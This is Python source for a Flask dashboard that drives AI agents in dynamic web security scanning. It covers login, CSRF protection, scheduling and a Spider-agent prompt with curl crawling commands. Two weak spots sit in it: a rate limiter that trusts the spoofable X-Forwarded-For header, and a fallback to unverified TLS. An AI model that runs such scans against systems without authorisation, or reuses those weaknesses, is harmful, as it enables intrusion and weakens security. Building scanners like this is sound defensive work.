"""
DAST Agent Dashboard — standalone Flask app.

Inspired by OWASP ZAP. Runs 24 specialist AI agents across 4 phases:
  • Discovery        (Spider, Recon, Passive Scanner, Secrets Scanner,
                     API Spec, Security Headers, Vulnerable JS Libs)
  • Active Scanning  (SQLi, XSS, SSRF, SSTI, XXE,
                     LFI/Path Traversal, Command Injection, Open Redirect)
  • Auth & Session   (Deserial, CORS, JWT, OAuth, CSRF)
  • Protocol         (WAF Bypass, TLS/SSL, Smuggling, OAST)
"""
from __future__ import annotations

import json
import importlib.util
import logging
import hmac
import os
import re
import secrets
import shlex
import ssl
import subprocess
import sys
import threading
import time
import traceback
import urllib.error
import urllib.request
from pathlib import Path

# ── Logging setup ────────────────────────────────────────────────────────────
_LOG_PATH = Path.home() / ".dast" / "dast.log"
_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)

def _setup_logging() -> logging.Logger:
    from logging.handlers import RotatingFileHandler
    root = logging.getLogger("dast")
    root.setLevel(logging.DEBUG)

    fmt_file    = logging.Formatter(
        "%(asctime)s %(levelname)-8s %(name)-20s %(message)s",
        datefmt="%Y-%m-%dT%H:%M:%S",
    )
    fmt_console = logging.Formatter("%(levelname)-8s %(name)-16s %(message)s")

    # Rotating file — 5 MB × 5 backups = 25 MB max
    fh = RotatingFileHandler(_LOG_PATH, maxBytes=5 * 1024 * 1024, backupCount=5, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt_file)

    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(fmt_console)

    if not root.handlers:
        root.addHandler(fh)
        root.addHandler(ch)
    return root

_root_logger = _setup_logging()
log          = logging.getLogger("dast.engine")
from collections import defaultdict
from pathlib import Path
from urllib.parse import urlparse, urljoin
import uuid
from datetime import datetime, timedelta, timezone
from typing import Optional

from flask import Flask, Response, jsonify, render_template, redirect, url_for, session
from flask import request as req
request = req  # alias — some handlers use `request` directly
from functools import wraps
from werkzeug.security import check_password_hash

# ── DAST Engine modules ───────────────────────────────────────────────────────
from modules.scope        import ScopeManager
from modules.evidence     import EvidenceStore, evidence_store as _ev_store
from modules.fingerprint  import fingerprint, fingerprint_summary
from modules.auth         import (AuthHandler, ReAuthSession,
                                   MacroReAuthSession, ProactiveReAuthSession,
                                   CookieJarRules,
                                   probe_no_auth, probe_expired_token,
                                   probe_idor, probe_admin_claim,
                                   UserContext, MultiUserScanner)
from modules.feedback          import FeedbackStore
from modules.reporting         import HtmlReport
from modules.crawler      import Crawler, SiteMap
from modules.fuzzer       import Fuzzer
from modules.payload_safety import filter_dangerous_surfaces
from modules.passive      import PassiveScanner, passive_scanner as _passive, PassiveInterceptSession
from modules.oast         import OASTServer, get_or_start_oast
from modules.openapi      import OpenAPIImporter, import_openapi
from modules.forcedbrowse import ForcedBrowser, BrowseResult, load_wordlist, load_multiple_wordlists, available_wordlists, WORDLIST_CATEGORIES
from modules.scanner      import VulnerabilityScanner, ScanFinding
_ENGINE_AVAILABLE = True

from modules.scan_profiles import list_profiles as _list_scan_profiles, get_engine_config as _get_profile_config, PROFILES as _SCAN_PROFILES

from modules.external_tools import (
    run_all_external_tools, get_available_tools,
    SqlmapRunner, NucleiRunner, NmapRunner,
    extract_dbms_hint,
)
_HAS_EXTERNAL_TOOLS = True
_SQLI_SURFACE_TYPES = frozenset(("query", "form", "json", "cookie"))

# ── Extended scan modules ────────────────────────────────────────────────────
from modules.nuclei_dast      import run_checks as nuclei_dast_checks
from modules.nuclei_exposures import run_checks as nuclei_exposure_checks
from modules.nuclei_misconfig import run_checks as nuclei_misconfig_checks
from modules.nuclei_tokens    import run_checks as nuclei_token_checks
from modules.js_library_scanner import scan_js_libraries
from modules.api_discovery    import ApiRouteDiscoverer
from modules.api_tester       import ApiActiveTester
from modules.dom_xss_active   import DomXssActiveScanner
from modules.race_condition   import RaceConditionTester
from modules.id_harvester     import ObjectIDHarvester
from modules.token_analysis   import analyze_tokens as analyze_session_tokens
from modules.baseline         import EndpointBaseline
from modules.anomaly_scorer   import AnomalyScorer
from modules.confidence       import ConfidenceScorer
from modules.dedup            import FindingDeduplicator
from modules.db_manager       import db as _db
from modules.vuln_chainer        import VulnChainer
from modules.attack_orchestrator import AttackOrchestrator
from modules.cvss_owasp       import enrich_all as _cvss_owasp_enrich
from modules.ajax_spider      import AjaxSpider
from modules.grpc_scanner     import GrpcScanner
from modules.wasm_scanner     import WasmScanner
from modules.intruder         import Intruder, AttackMode
from modules.tls_analyzer     import TLSAnalyzer
from modules.param_digger     import ParamDigger, ParamDiggerResult
from modules.soap_scanner     import SOAPScanner, SOAPFinding
from modules.access_control   import AccessControlTester, AccessControlFinding
from modules.exif_scanner     import ExifScanner
from modules.port_scanner     import PortScanner, PortFinding
from modules.sequence_scanner import SequenceScanner, Sequence, SequenceStep
from modules.postman_importer import PostmanImporter, PostmanRequest
from modules.burp_bounty      import BurpBountyEngine, BurpBountyFinding
from modules.finding_correlator import (FindingCorrelator,
                                        confidence_gate as _confidence_gate)
from modules.finding_postprocessor import postprocess_findings
from modules.api_exposure_diff import ApiExposureDiffer
from modules.auth_journey import Journey, JourneyScanner, JourneyStep
from modules.browser_security import BrowserSecurityAnalyzer
from modules.coverage_registry import default_registry
from modules.evidence_replay import EvidenceReplayBuilder
from modules.false_positive_lab import FalsePositiveLab
from modules.oauth_oidc_scanner import OAuthOIDCAnalyzer
from modules.resumable_scan import ResumableScanStore
from modules.event_bus        import (
    get_global_bus, safe_publish,
    FINDING_DISCOVERED, SCAN_STARTED, SCAN_COMPLETE, SCAN_STOPPED, SCAN_ERROR,
    PHASE_STARTED, PHASE_COMPLETE, AGENT_DONE, FINDING_DEDUPLICATED,
    EXTERNAL_TOOL_DONE, CRAWL_URL_FOUND, AUTH_REFRESHED, AUTH_FAILED,
)
from modules.storage          import get_store
from modules.llm_provider     import LLMProvider

_HAS_NUCLEI_DAST      = True
_HAS_NUCLEI_EXPOSURES = True
_HAS_NUCLEI_MISCONFIG = True
_HAS_NUCLEI_TOKENS    = True
_HAS_JS_SCANNER       = True
_HAS_API_DISCOVERY    = True
_HAS_API_TESTER       = True
_HAS_DOM_XSS          = True
_HAS_RACE             = True
_HAS_ID_HARVESTER     = True
_HAS_TOKEN_ANALYSIS   = True
_HAS_BASELINE         = True
_HAS_ANOMALY          = True
_HAS_CONFIDENCE       = True
_HAS_DEDUP            = True
_HAS_VULN_CHAINER          = True
_HAS_ATTACK_ORCHESTRATOR   = True
_HAS_AUTH_PROBES           = True
_HAS_FEEDBACK_STORE        = True
_HAS_FINDING_CORRELATOR    = True
_HAS_HTML_REPORT           = True
_HAS_CVSS_OWASP       = True
_AJAX_SPIDER_AVAILABLE = True

try:
    from modules.http2_smuggler import HTTP2Smuggler
    _HAS_HTTP2_SMUGGLER = True
except Exception:
    _HAS_HTTP2_SMUGGLER = False

try:
    from modules.ua_diff import UADiffScanner
    _HAS_UA_DIFF = True
except Exception:
    _HAS_UA_DIFF = False

try:
    from modules.crypto_scanner import CryptoScanner
    _HAS_CRYPTO_SCANNER = True
except Exception:
    _HAS_CRYPTO_SCANNER = False

try:
    from modules.biz_logic import BusinessLogicTester
    _HAS_BIZ_LOGIC = True
except Exception:
    _HAS_BIZ_LOGIC = False

try:
    from modules.bcheck_engine import BCheckEngine as _BCheckEngine
    _HAS_BCHECKS = True
except Exception:
    _HAS_BCHECKS = False

try:
    from modules.yaml_bcheck import YAMLRuleEngine as _YAMLRuleEngine
    _HAS_YAML_BCHECKS = True
except Exception:
    _HAS_YAML_BCHECKS = False

_HAS_IDOR_TESTS = True  # MultiUserScanner/UserContext imported unconditionally above

try:
    from modules.source_discovery import SourceDiscovery as _SourceDiscovery
    from modules.source_discovery import extract_webpack_endpoints as _extract_webpack_eps
    _HAS_SOURCE_DISCOVERY = True
except Exception:
    _HAS_SOURCE_DISCOVERY = False

try:
    from modules.websocket import WebSocketScanner as _WebSocketScanner
    _HAS_WS = True
except Exception:
    _HAS_WS = False

try:
    from modules.graphql import GraphQLScanner as _GraphQLScanner
    _HAS_GQL = True
except Exception:
    _HAS_GQL = False

try:
    from modules.saml_scanner import SAMLScanner as _SAMLScanner
    _HAS_SAML = True
except Exception:
    _HAS_SAML = False

try:
    from modules.shadow_api import ShadowAPIScanner as _ShadowAPIScanner
    _HAS_SHADOW_API = True
except Exception:
    _HAS_SHADOW_API = False

try:
    from modules.cache_poisoning import CachePoisoningScanner as _CachePoisoningScanner
    _HAS_CACHE_POISON = True
except Exception:
    _HAS_CACHE_POISON = False

try:
    from modules.llm_app_scanner import LLMAppScanner as _LLMAppScanner
    _HAS_LLM_SCANNER = True
except Exception:
    _HAS_LLM_SCANNER = False

try:
    from modules.codec import decode_auto as _codec_decode_auto, encode as _codec_encode, CodecChain as _CodecChain, jwt_analyze as _codec_jwt_analyze
    _HAS_CODEC = True
except Exception:
    _HAS_CODEC = False

# Katana / httpx — Go binaries that may live in ~/go/bin (not always in PATH)
import shutil as _shutil_top
_GO_BIN = str(Path.home() / "go" / "bin")
if _GO_BIN not in os.environ.get("PATH", ""):
    os.environ["PATH"] = _GO_BIN + os.pathsep + os.environ.get("PATH", "")
_KATANA_AVAILABLE = bool(_shutil_top.which("katana"))
_HTTPX_AVAILABLE  = bool(_shutil_top.which("httpx"))


def _load_startup_pattern_packs() -> None:
    raw = os.environ.get("DAST_PATTERN_PACKS") or os.environ.get("DAST_PATTERN_PACK", "")
    if not raw.strip():
        return
    paths = [
        part.strip()
        for chunk in raw.split(os.pathsep)
        for part in chunk.split(",")
        if part.strip()
    ]
    if not paths:
        return
    try:
        from modules.industry_patterns import load_pattern_packs
        loaded = load_pattern_packs(paths)
        log.info("[Engine] Loaded %d startup DAST pattern pack(s)", loaded)
    except Exception as exc:
        log.warning("[Engine] Failed to load startup pattern pack(s): %s", exc)


_load_startup_pattern_packs()

_ASSURANCE_REGISTRY = default_registry()
_API_EXPOSURE_DIFFER = ApiExposureDiffer()
_BROWSER_SECURITY_ANALYZER = BrowserSecurityAnalyzer()
_OAUTH_ANALYZER = OAuthOIDCAnalyzer()
_EVIDENCE_REPLAY_BUILDER = EvidenceReplayBuilder()
_FALSE_POSITIVE_LAB = FalsePositiveLab()
_RESUMABLE_SCAN_STORE = ResumableScanStore()
_JOURNEY_SCANNER = JourneyScanner()

app = Flask(__name__)
_flask_secret = os.environ.get("REVELIO_SECRET") or os.environ.get("FLASK_SECRET_KEY")
if not _flask_secret:
    _flask_secret = secrets.token_hex(32)
    log.warning("REVELIO_SECRET is not set; using an ephemeral development Flask secret")
app.secret_key = _flask_secret
app.config.update(
    TEMPLATES_AUTO_RELOAD=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE=os.environ.get("DAST_COOKIE_SAMESITE", "Strict"),
    SESSION_COOKIE_SECURE=os.environ.get("DAST_COOKIE_SECURE", "0").strip().lower()
    in {"1", "true", "yes", "on"},
    PERMANENT_SESSION_LIFETIME=timedelta(
        hours=float(os.environ.get("DAST_SESSION_HOURS", "8"))
    ),
    DAST_CSRF_PROTECT=os.environ.get("DAST_CSRF_PROTECT", "1").strip().lower()
    not in {"0", "false", "no", "off"},
)

_req_log = logging.getLogger("dast.http")

@app.before_request
def _log_request():
    # Skip noisy poll endpoints from request log
    _quiet = ("/api/scan/status", "/api/activity", "/api/findings", "/api/logs")
    if not req.path.startswith(_quiet):
        _req_log.debug("→ %s %s", req.method, req.path)

@app.after_request
def _log_response(response):
    _quiet = ("/api/scan/status", "/api/activity", "/api/findings", "/api/logs")
    if not req.path.startswith(_quiet):
        level = logging.WARNING if response.status_code >= 400 else logging.DEBUG
        _req_log.log(level, "← %s %s %d", req.method, req.path, response.status_code)
    return response

@app.after_request
def _security_headers(response):
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    response.headers.setdefault("X-XSS-Protection", "0")
    response.headers.setdefault(
        "Permissions-Policy",
        "camera=(), microphone=(), geolocation=(), payment=()",
    )
    return response

# ── Auth credentials ───────────────────────────────────────────────────────────
_DEFAULT_ADMIN_USER = "admin"
_DEFAULT_ADMIN_PASSWORD = "admin"
_login_attempts: dict[str, list[float]] = {}

_INTERNAL_TOKEN = os.urandom(24).hex()   # scheduler → server auth bypass
_SERVER_PORT    = 5002                   # overwritten by main.py via app.config


def _truthy(value: str | None) -> bool:
    return (value or "").strip().lower() in {"1", "true", "yes", "on"}


def _login_window_seconds() -> int:
    try:
        return max(1, int(os.environ.get("DAST_LOGIN_WINDOW_SECONDS", "900")))
    except ValueError:
        return 900


def _login_max_attempts() -> int:
    try:
        return max(0, int(os.environ.get("DAST_LOGIN_MAX_ATTEMPTS", "5")))
    except ValueError:
        return 5


def _client_ip() -> str:
    forwarded = (req.headers.get("X-Forwarded-For") or "").split(",", 1)[0].strip()
    return forwarded or req.remote_addr or "unknown"


def _login_attempt_key(username: str) -> str:
    return f"{_client_ip()}:{username.strip().lower()}"


def _is_login_limited(username: str) -> bool:
    limit = _login_max_attempts()
    if limit <= 0:
        return False
    key = _login_attempt_key(username)
    now = time.monotonic()
    window = _login_window_seconds()
    attempts = [ts for ts in _login_attempts.get(key, []) if now - ts < window]
    _login_attempts[key] = attempts
    return len(attempts) >= limit


def _record_failed_login(username: str) -> None:
    key = _login_attempt_key(username)
    now = time.monotonic()
    window = _login_window_seconds()
    attempts = [ts for ts in _login_attempts.get(key, []) if now - ts < window]
    attempts.append(now)
    _login_attempts[key] = attempts


def _clear_failed_logins(username: str) -> None:
    _login_attempts.pop(_login_attempt_key(username), None)


def _verify_dashboard_credentials(username: str, password: str) -> bool:
    expected_user = (
        os.environ.get("DAST_ADMIN_USER") or _DEFAULT_ADMIN_USER
    ).strip() or _DEFAULT_ADMIN_USER
    if not hmac.compare_digest(username, expected_user):
        return False

    password_hash = (os.environ.get("DAST_ADMIN_PASSWORD_HASH") or "").strip()
    if password_hash:
        try:
            return check_password_hash(password_hash, password)
        except ValueError:
            log.warning("Invalid DAST_ADMIN_PASSWORD_HASH; dashboard login disabled")
            return False

    plain_password = os.environ.get("DAST_ADMIN_PASSWORD")
    if plain_password is not None:
        return hmac.compare_digest(password, plain_password)

    if _truthy(os.environ.get("DAST_ALLOW_DEFAULT_LOGIN")):
        return (
            username == _DEFAULT_ADMIN_USER
            and hmac.compare_digest(password, _DEFAULT_ADMIN_PASSWORD)
        )
    return False


def _ensure_csrf_token() -> str:
    token = session.get("_csrf_token")
    if not token:
        token = secrets.token_urlsafe(32)
        session["_csrf_token"] = token
    return token


def _csrf_enabled() -> bool:
    if app.config.get("TESTING") and not app.config.get("DAST_TEST_CSRF_ENABLED"):
        return False
    return bool(app.config.get("DAST_CSRF_PROTECT", True))


@app.before_request
def _csrf_protect_state_changes():
    if req.headers.get("X-Internal-Token") == _INTERNAL_TOKEN:
        return None
    if req.method not in {"POST", "PUT", "PATCH", "DELETE"}:
        return None
    if req.endpoint in {"login_page"}:
        return None
    if not _csrf_enabled() or not session.get("authenticated"):
        return None

    expected = session.get("_csrf_token")
    supplied = (
        req.headers.get("X-CSRF-Token")
        or req.headers.get("X-CSRFToken")
        or req.form.get("_csrf_token")
    )
    if expected and supplied and hmac.compare_digest(str(expected), str(supplied)):
        return None
    if req.path.startswith("/api/"):
        return jsonify({"ok": False, "error": "csrf_failed"}), 403
    return "CSRF validation failed", 403


def _login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if req.headers.get("X-Internal-Token") == _INTERNAL_TOKEN:
            return f(*args, **kwargs)
        if not session.get("authenticated"):
            if req.path.startswith("/api/"):
                return jsonify({"ok": False, "error": "not_authenticated"}), 401
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    return decorated

# ── Scan History (delegates to db_manager singleton) ─────────────────────────

def _db_delete_scan(scan_id: str) -> bool:
    return _db.delete_scan(scan_id)

def _same_scan_target(a: str, b: str) -> bool:
    def _norm(v: str) -> str:
        return (v or "").strip().rstrip("/").lower()
    return bool(_norm(a) and _norm(a) == _norm(b))

def _rebuild_seen_findings() -> None:
    import hashlib
    _seen_findings.clear()
    for f in _findings:
        ftext = f.get("finding") or f.get("detail") or ""
        furl = f.get("url") or f.get("target") or ""
        key = (f.get("agent", ""), hashlib.md5((ftext + "|" + furl).encode()).hexdigest())
        _seen_findings.add(key)

def _clear_deleted_scan_from_memory(scan_id: str, target: str = "") -> int:
    """Remove restored/current in-memory results that represent a deleted scan."""
    global _scan_target, _restored_scan_id, _last_scan_summary
    removed = 0
    clear_current_snapshot = False

    with _lock:
        before = len(_findings)
        _findings[:] = [
            f for f in _findings
            if f.get("scan_id") != scan_id and f.get("_scan_id") != scan_id
        ]
        removed = before - len(_findings)
        clear_current_snapshot = (
            _restored_scan_id == scan_id
            or (not _scan_active and _same_scan_target(_scan_target, target))
        )
        if clear_current_snapshot:
            _findings.clear()
            _passive_findings.clear()
            _scan_target = ""
            _restored_scan_id = None
        _rebuild_seen_findings()

    if _last_scan_summary and (
        _last_scan_summary.get("scan_id") == scan_id
        or (clear_current_snapshot and _same_scan_target(_last_scan_summary.get("target", ""), target))
    ):
        _last_scan_summary = {}
        _db_save_kv("last_scan_summary", {})
    return removed

def _db_get_schedules() -> list:
    try:
        return _db.get_schedules()
    except Exception:
        return []

def _db_save_schedule(sched_id: str, target: str, label: str,
                      interval_minutes: int, profile: str, next_run: str):
    try:
        _db.save_schedule(sched_id, target, label, interval_minutes, profile, next_run)
    except Exception:
        pass

def _db_delete_schedule(sched_id: str):
    try:
        _db.delete_schedule(sched_id)
    except Exception:
        pass

def _history_summary_from_findings(findings: list) -> tuple[str, int]:
    counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    total = 0
    for f in findings or []:
        sev = (f.get("severity") or "info").lower()
        if sev not in counts:
            sev = "info"
        count = int(f.get("count") or 1)
        counts[sev] += count
        total += count
    summary = ", ".join(f"{n} {sev}" for sev, n in counts.items() if n)
    return summary, total

def _history_summary_from_scan(row: dict) -> tuple[str, int]:
    if row.get("summary"):
        return row.get("summary", ""), int(row.get("finding_count") or 0)
    counts = {
        "critical": int(row.get("critical_count") or 0),
        "high":     int(row.get("high_count") or 0),
        "medium":   int(row.get("medium_count") or 0),
        "low":      int(row.get("low_count") or 0),
        "info":     int(row.get("info_count") or 0),
    }
    summary = ", ".join(f"{n} {sev}" for sev, n in counts.items() if n)
    total = sum(counts.values()) or int(row.get("finding_count") or 0)
    return summary, total

def _clean_scan_name(name: str) -> str:
    name = re.sub(r"\s+", " ", (name or "").strip())
    return name[:80]

def _scan_name_from_row(row: dict) -> str:
    meta = row.get("engine_meta")
    if isinstance(meta, str) and meta:
        try:
            meta = json.loads(meta)
        except Exception:
            meta = {}
    if isinstance(meta, dict):
        return _clean_scan_name(meta.get("scan_name") or meta.get("name") or "")
    return ""

def _scan_history_identifier(scan_id: str, started: str = "", scan_name: str = "") -> str:
    short_id = (scan_id or "").replace("-", "")[:8] or "unknown"
    custom = _clean_scan_name(scan_name)
    if custom:
        return f"{custom} - {short_id}"
    stamp = "unknown-time"
    if started:
        try:
            dt = datetime.fromisoformat(str(started).replace("Z", "+00:00"))
            stamp = dt.strftime("%Y%m%d-%H%M%S")
        except Exception:
            stamp = re.sub(r"[^0-9A-Za-z]+", "", str(started))[:15] or stamp
    return f"scan-{stamp}-{short_id}"

def _db_update_schedule(sched_id: str, enabled: bool = None,
                        last_run: str = None, next_run: str = None):
    try:
        kwargs = {}
        if enabled is not None:
            kwargs["enabled"] = int(enabled)
        if last_run is not None:
            kwargs["last_run"] = last_run
        if next_run is not None:
            kwargs["next_run"] = next_run
        if kwargs:
            _db.update_schedule(sched_id, **kwargs)
    except Exception:
        pass

def _scheduler_fire(sched: dict):
    """Trigger a scan for a schedule entry via the internal API."""
    import requests as _rs
    port = app.config.get("PORT", _SERVER_PORT)
    try:
        _rs.post(
            f"http://127.0.0.1:{port}/api/scan/launch",
            json={"target": sched["target"], "profile": sched.get("profile", "default")},
            headers={"X-Internal-Token": _INTERNAL_TOKEN},
            timeout=8,
        )
    except Exception:
        pass
    now = datetime.now(timezone.utc)
    from datetime import timedelta
    next_run = (now + timedelta(minutes=sched["interval_minutes"])).isoformat()
    _db_update_schedule(sched["id"], last_run=now.isoformat(), next_run=next_run)

def _start_scheduler():
    """Background thread: checks every 30s for due schedules."""
    import time as _t
    def _loop():
        while True:
            _t.sleep(30)
            try:
                now = datetime.now(timezone.utc)
                for s in _db_get_schedules():
                    if not s["enabled"] or not s["next_run"]:
                        continue
                    try:
                        nr = datetime.fromisoformat(s["next_run"])
                        if now >= nr:
                            _scheduler_fire(s)
                    except Exception:
                        pass
            except Exception:
                pass
    t = threading.Thread(target=_loop, daemon=True, name="dast-scheduler")
    t.start()

_start_scheduler()

def _db_save_kv(key: str, value):
    try:
        _db.kv_set(key, value)
    except Exception:
        pass

def _db_get_kv(key: str, default=None):
    try:
        return _db.kv_get(key, default)
    except Exception:
        return default

def _db_save_scan(scan_id: str, target: str, started: str, findings: list):
    # No-op: scan lifecycle is fully managed via _active_scan_id in scan_launch/stop.
    # Previously this created a ghost entry in the DB with a different scan_id,
    # which caused _db_restore_latest_scan to pick up an empty scan on restart.
    pass

def _db_get_history(limit: int = 20) -> list:
    try:
        rows = _db.get_scan_history(limit=limit)
        by_id: dict[str, dict] = {}
        for r in rows:
            scan_id = r.get("scan_id", "")
            summary, finding_count = _history_summary_from_scan(r)
            by_id[scan_id] = {
                "id":            scan_id,
                "name":          _scan_history_identifier(scan_id, r.get("started_at", ""), _scan_name_from_row(r)),
                "custom_name":   _scan_name_from_row(r),
                "short_id":      (scan_id or "").replace("-", "")[:8],
                "target":        r.get("target", ""),
                "started":       r.get("started_at", ""),
                "finished":      r.get("completed_at", ""),
                "summary":       summary,
                "finding_count": finding_count,
                "status":        r.get("status", ""),
            }

        # Some engine paths still write first to the older FindingStore
        # (dast_findings.db). Merge it into the timeline view without importing
        # deleted/tombstoned scans back into the master DB.
        try:
            deleted = getattr(_db, "_deleted_scan_ids", lambda: set())()
            store = get_store()
            for s in store.list_scans(limit=limit):
                scan_id = s.get("scan_id", "")
                if not scan_id or scan_id in deleted:
                    continue
                findings = []
                try:
                    findings = store.get_findings(scan_id)
                except Exception:
                    pass
                summary, finding_count = _history_summary_from_findings(findings)
                if not finding_count:
                    finding_count = int(s.get("finding_count") or 0)
                item = {
                    "id":            scan_id,
                    "name":          _scan_history_identifier(scan_id, s.get("started_at", ""), _scan_name_from_row(s)),
                    "custom_name":   _scan_name_from_row(s),
                    "short_id":      (scan_id or "").replace("-", "")[:8],
                    "target":        s.get("target", ""),
                    "started":       s.get("started_at", ""),
                    "finished":      s.get("completed_at", ""),
                    "summary":       summary,
                    "finding_count": finding_count,
                    "status":        s.get("status", ""),
                }
                existing = by_id.get(scan_id)
                if not existing:
                    by_id[scan_id] = item
                elif item["finding_count"] > int(existing.get("finding_count") or 0):
                    existing.update({
                        "summary":       item["summary"] or existing.get("summary", ""),
                        "finding_count": item["finding_count"],
                    })
        except Exception:
            pass

        return sorted(
            by_id.values(),
            key=lambda s: s.get("started") or "",
            reverse=True,
        )[:limit]
    except Exception:
        return []

# Migrate legacy single-JSON-blob scans into the new normalised DB on first run
try:
    _db.migrate_legacy()
except Exception:
    pass
# Seed built-in fuzzer payload lists into the payload_library table
try:
    _db.seed_builtin_payloads()
except Exception:
    pass


def _db_restore_latest_scan():  # called after globals are declared (see below)
    """On startup, reload findings from the most recent completed scan into memory."""
    global _findings, _scan_target, _seen_findings, _restored_scan_id
    try:
        history = _db.get_scan_history(limit=1)
        if not history:
            return
        last = history[0]
        scan_id = last.get("scan_id", "")
        target  = last.get("target", "")
        if not scan_id:
            return
        restored = _db.get_findings(scan_id=scan_id, limit=10000)
        if restored:
            _findings    = restored
            _scan_target = target
            _restored_scan_id = scan_id
            import hashlib
            for f in restored:
                _ftext = (f.get("finding") or "")
                _furl  = (f.get("url") or "")
                key = (f.get("agent", ""), hashlib.md5((_ftext + "|" + _furl).encode()).hexdigest())
                _seen_findings.add(key)
            log.info("[DB] Restored %d findings from last scan (%s)", len(restored), target)
    except Exception as _e:
        log.debug("[DB] Could not restore last scan: %s", _e)


def _log_activity(event: str, target: str = "", detail: str = ""):
    """Append a timestamped scan-event to the in-memory activity log."""
    global _activity_log
    _activity_log.append({
        "ts":     datetime.now(timezone.utc).strftime("%H:%M:%S"),
        "event":  event,
        "target": target,
        "detail": detail,
    })
    if len(_activity_log) > _ACTIVITY_MAX:
        _activity_log = _activity_log[-_ACTIVITY_MAX:]


# ── SSL context (macOS cert fix) ──────────────────────────────────────────────

def _make_ssl_ctx() -> ssl.SSLContext:
    try:
        import certifi
        return ssl.create_default_context(cafile=certifi.where())
    except ImportError:
        pass
    try:
        ctx = ssl.create_default_context()
        ctx.load_default_certs()
        return ctx
    except Exception:
        pass
    return ssl._create_unverified_context()

_SSL_CTX = _make_ssl_ctx()


# ── HTTP helper ───────────────────────────────────────────────────────────────

def _http_post(url: str, payload: bytes, headers: dict, timeout: int = 40) -> dict:
    request = urllib.request.Request(url, data=payload, headers=headers)
    try:
        resp = urllib.request.urlopen(request, timeout=timeout, context=_SSL_CTX)
        raw  = resp.read()
    except urllib.error.HTTPError as e:
        try:
            err_body = json.loads(e.read())
            if isinstance(err_body.get("error"), dict):
                raise RuntimeError(err_body["error"].get("message", str(e)))
            raise RuntimeError(str(err_body.get("error", e)))
        except (json.JSONDecodeError, KeyError):
            raise RuntimeError(f"HTTP {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        raise RuntimeError(f"Network error: {e.reason}")

    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        raise RuntimeError(f"Invalid JSON response: {raw[:200]}")


# ── Robust JSON parser ────────────────────────────────────────────────────────

def _parse_llm_json(text: str) -> dict:
    text = text.strip()
    for s, e in [(text.find("{"), text.rfind("}")),
                 (text.find("["), text.rfind("]"))]:
        if s != -1 and e != -1 and e > s:
            try:
                return json.loads(text[s:e+1])
            except json.JSONDecodeError:
                pass
    # strip markdown fences
    clean = re.sub(r"```(?:json)?", "", text).strip()
    try:
        return json.loads(clean)
    except json.JSONDecodeError as exc:
        raise ValueError(f"Cannot parse JSON from LLM: {exc}\nRaw: {text[:300]}")


# ── API key store ─────────────────────────────────────────────────────────────

_api_keys: dict = {}

# ── Event bus + persistent storage (init on first use via singletons) ─────────
def _storage_finding_handler(event_type: str, payload: dict) -> None:
    """Persist finding to FindingStore whenever FINDING_DISCOVERED fires."""
    try:
        sid = payload.get("_scan_id") or _active_scan_id
        if sid:
            try:
                _db.write_finding(sid, payload)
            except Exception:
                pass
            try:
                get_store().add_finding(sid, payload)
            except Exception:
                pass
            # Gap 3: coverage tracking for event-bus path
            if payload.get("url"):
                _db.mark_endpoint_tested(sid, payload["url"],
                                         method=payload.get("method", "GET"),
                                         phase=payload.get("phase", ""))
    except Exception as exc:
        log.debug("[storage_handler] %s", exc)

_active_scan_id: str | None = None  # set at scan launch, cleared at complete

@app.route("/api/keys", methods=["POST"])
@_login_required
def set_keys():
    data = req.json or {}
    if data.get("openai"):
        _api_keys["openai"] = data["openai"].strip()
    if data.get("anthropic"):
        _api_keys["anthropic"] = data["anthropic"].strip()
    if "auth_header" in data:
        val = (data["auth_header"] or "").strip()
        if val:
            _api_keys["auth_header"] = val
        else:
            _api_keys.pop("auth_header", None)
    if "use_headless_browser" in data:
        _api_keys["use_headless_browser"] = bool(data["use_headless_browser"])
    return jsonify({"success": True, "keys": list(_api_keys.keys())})

@app.route("/api/keys")
@_login_required
def get_keys():
    return jsonify({"keys": list(_api_keys.keys())})


# ── DAST Agent Specs ──────────────────────────────────────────────────────────
# 17 specialist agents across 4 phases (ZAP-inspired taxonomy)

_DAST_AGENTS = [
    # ── PHASE 1: DISCOVERY ────────────────────────────────────────────────────
    {
        "name": "Spider Agent",
        "icon": "🕷️",
        "phase": "Discovery",
        "task": (
            "Crawl the target web application to discover ALL endpoints, links, forms, API paths, "
            "and JavaScript bundle routes — even if the target requires authentication. "
            "STEP 1 — Fetch root and follow redirects, then extract all href/src/action links: "
            "curl -sL {target} -o /tmp/dast_root.html; "
            "python3 -c \"import re; h=open('/tmp/dast_root.html').read(); "
            "links=set(re.findall(r'(?:href|src|action)=[\\\"\\\']((?!http|mailto|#)[^\\\"\\\' ]+)[\\\"\\\'\\\\s]', h)); "
            "[print(l) for l in sorted(links)]\" "
            "STEP 2 — Extract JS bundle URLs from that page, fetch each bundle, extract API route strings: "
            "python3 -c \"import re,subprocess; h=open('/tmp/dast_root.html').read(); "
            "js_urls=[u for u in set(re.findall(r'src=[\\\"\\\']((?:https?://[^ ]+)?/[^\\\"\\\' ]+\\\\.js[^\\\"\\\' ]*)[\\\"\\\'\\\\s]', h))]; "
            "[print(r) for js in js_urls[:8] "
            "for r in set(re.findall(r'[\\\"\\\'/](/(?:api|v[0-9]+|auth|user|admin|graphql|internal)[^\\\"\\\\'\\\\s]{0,100})', "
            "subprocess.run([\\\"curl\\\",\\\"-sL\\\",\\\"http://\\\"+js.lstrip(\\\"/\\\")],capture_output=True,text=True,timeout=10).stdout[:300000]))]\""
            "STEP 3 — Probe standard paths that are often unauthenticated (report status code for each): "
            "for path in robots.txt sitemap.xml .well-known/security.txt .well-known/openid-configuration "
            "api/ v1/ v2/ graphql health status metrics ping version swagger.json openapi.json api-docs; do "
            "  result=$(curl -so /dev/null -w \"\\n%{http_code} {target}/$path\" {target}/$path 2>/dev/null); "
            "  echo \"$result\"; "
            "done "
            "STEP 4 — If katana is available (optional): katana -u {target} -depth 4 -jc -silent "
            "Report every discovered path — a 401/302 still confirms the endpoint exists."
        ),
